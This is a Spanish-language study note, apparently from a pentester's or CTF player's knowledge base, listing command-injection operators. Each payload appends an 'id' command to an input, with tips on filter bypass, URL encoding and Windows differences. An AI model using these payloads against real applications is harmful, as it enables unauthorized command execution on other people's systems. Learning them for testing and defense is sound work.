---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Command Injection - Operadores Generales

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `127.0.0.1; id` | Ejecuta `id` después del primer comando | Ambos siempre ejecutan. Linux/PowerShell. NO funciona en cmd.exe. |
| `127.0.0.1%0aid` | Newline como separador secuencial | Filtro bloquea `;` pero deja `\n`. URL-encode `%0a`. |
| `127.0.0.1 & id` | Backgrounds primero, ejecuta el segundo | Filtros que bloquean `;` pero ignoran `&`. |
| `127.0.0.1 \| id` | Pipe — output del primero a stdin del segundo, ver solo el segundo | Filtro permite pipes. Salida limpia. |
| `127.0.0.1 && id` | Ejecuta `id` SOLO si el primero tuvo éxito | Cuando el primer cmd es válido y querés confirmar éxito. |
| `127.0.0.1 \|\| id` | Ejecuta `id` SOLO si el primero falla | **Trick CTF**: dejar el primer cmd inválido → output limpio sin ruido. |
| `127.0.0.1`id`` | Sub-shell con backticks — ejecuta `id` y embebe resultado | **Linux only**. Stdout del sub-cmd se inserta en el comando padre. |
| `127.0.0.1$(id)` | Sub-shell `$()` — equivalente más moderno | **Linux only**. Permite anidar `$(cmd1 $(cmd2))`. |
^ci-operadores-generales

### URL-encoded (cuando se inyectan en query/body)

| Operador | Encoded |
|:---:|:---:|
| `;` | `%3b` |
| `\n` | `%0a` |
| `&` | `%26` |
| `\|` | `%7c` |
| `&&` | `%26%26` |
| `\|\|` | `%7c%7c` |
| `` ` `` | `%60` |
| `$()` | `%24%28%29` |

> [!WARNING] Excepción Windows
> `;` **NO funciona** en CMD. Sí funciona en PowerShell. En CMD usar `&` o `&&`.

> [!TIP] Truco CTFs
> `||` da salida limpia: dejá el primer comando intencionalmente roto (sin argumento, `127.0.0.1` sin `ping`, etc.) → falla → solo se ve la salida de la inyección.

---
